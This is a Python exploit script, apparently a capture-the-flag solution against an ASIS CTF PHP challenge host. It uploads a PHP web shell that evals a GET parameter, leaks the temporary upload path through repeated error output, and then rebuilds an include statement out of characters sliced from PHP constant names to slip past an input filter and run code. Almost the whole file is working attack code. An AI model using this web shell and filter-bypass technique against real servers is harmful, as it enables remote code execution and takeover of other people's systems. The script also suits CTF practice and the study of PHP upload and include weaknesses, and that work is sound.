import re
from pwn import *
from urllib.parse import quote

HOST = 'securesecrets.asisctf.com'

payload = """<?php
    function print_errors($ab, $errString){
        echo("ERROR: " . $errString);
    }
    set_error_handler ( "print_errors" , E_ALL );

    eval($_GET["real_eval"]);
"""

postBody = (
    "\r\n"
    "--BOUNDARY\r\n"
    'Content-Disposition: form-data; name="file"; filename="file";\r\n'
    '\r\n'
    f'{payload}'
    "\r\n--BOUNDARY--"
)

mapping = {'/': "PHP_BINARY[PHP_DEBUG]", 'a': 'PHP_PREFIX[E_NOTICE]', 'b': 'READLINE_LIB[DNS_NS]', 'c': 'PHP_PREFIX[INI_ALL]', 'd': 'DATE_RSS[LOCK_UN]', 'e': 'READLINE_LIB[LOCK_UN]', 'f': 'PHP_SAPI[PHP_ZTS]', 'g': 'PHP_SAPI[LC_ALL]', 'h': 'PHP_LIBDIR[LOG_MAIL]', 'i': 'PHP_OS[DNS_A]', 'j': None, 'k': 'ICONV_IMPL[DNS_NS]', 'l': 'DATE_COOKIE[PHP_ZTS]', 'm': 'PHP_SAPI[DNS_NS]', 'n': 'PHP_OS[DNS_NS]', 'o': 'PHP_PREFIX[LC_ALL]', 'p': 'PHP_SAPI[DNS_A]', 'q': None, 'r': 'PHP_PREFIX[LOCK_UN]', 's': 'PHP_PREFIX[DNS_NS]', 't': 'READLINE_LIB[LC_ALL]', 'u': 'PHP_OS[LOCK_UN]', 'v': 'PHP_LOCALSTATEDIR[IMAGETYPE_JPX]', 'w': 'ICONV_IMPL[ZLIB_BLOCK]', 'x': 'PHP_OS[E_PARSE]', 'y': None, 'z': 'PHP_EXTENSION_DIR[CURLOPT_NOPROGRESS]', 'A': 'OPENSSL_DEFAULT_STREAM_CIPHERS[T_SR]', 'B': None, 'C': 'OPENSSL_DEFAULT_STREAM_CIPHERS[DNS_A]', 'D': 'DATE_RSS[PHP_ZTS]', 'E': 'OPENSSL_DEFAULT_STREAM_CIPHERS[T_POW]', 'F': None, 'G': 'OPENSSL_DEFAULT_STREAM_CIPHERS[CURLOPT_POST]', 'H': 'DATE_ATOM[INI_ALL]', 'I': None, 'J': None, 'K': None, 'L': 'PHP_OS[PHP_ZTS]', 'M': 'DATE_RSS[ZLIB_BLOCK]', 'N': None, 'O': 'DATE_RSS[PHP_FLOAT_DIG]', 'P': 'DATE_ATOM[DOM_SYNTAX_ERR]', 'Q': None, 'R': 'OPENSSL_DEFAULT_STREAM_CIPHERS[T_DIR]', 'S': 'OPENSSL_VERSION_TEXT[E_PARSE]', 'T': 'DATE_ATOM[LC_ALL]', 'U': None, 'V': None, 'W': None, 'X': None, 'Y': 'DATE_RSS[INI_ALL]', 'Z': None}

def generate_string(goal):
    includeStrChars = []
    for x in path:
        if mapping[x] is None:
            return (False, x)

        includeStrChars.append(mapping[x])

    return (True, '.'.join(includeStrChars))


while True:
    r = remote(HOST, 80)
    r.send(
        f'POST /Y0U_CANT_GUESS_THIS_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php?yummy={quote("A: echo PHP_VERSION; goto A;")} HTTP/1.1\r\n')
    r.send(f'Host: {HOST}\r\n')
    r.send(f'Content-Length: {len(postBody)}\r\n')
    r.send(f'Range: bytes=0-\r\n')
    r.send('Content-Type: multipart/form-data; boundary=BOUNDARY\r\n')
    r.send('\r\n')
    r.send(postBody)

    info("Sending first request")

    regex = r" (/tmp/.+)\n"

    while(True):
        content = r.read().decode()

        matches = re.search(regex, content)
        if matches:
            info("Leaked temp upload path %s", matches.group(0).strip())

            path = matches.group(0).strip()
            break


    succ, includeStr = generate_string(path)

    if not succ:
        warn("No mapping for character %s, retrying...\n", includeStr)
        r.close()
        continue

    break


payload = f'include {includeStr};'
payload = quote(payload)

info('URI Encoded Payload: %s', payload)

info('Final URL: %s', f'{HOST}/Y0U_CANT_GUESS_THIS_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php?yummy={payload}')

r2 = remote(HOST, 80)
r2.send(f'GET /Y0U_CANT_GUESS_THIS_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php?yummy={payload} HTTP/1.1\r\n')
r2.send(f'Range: bytes=0-\r\n')
r2.send(f'Host: {HOST}\r\n')
r2.send('\r\n')

info("Sending second request")

r2.recvuntil(b'-->')
while True:
    print(r2.read().decode())
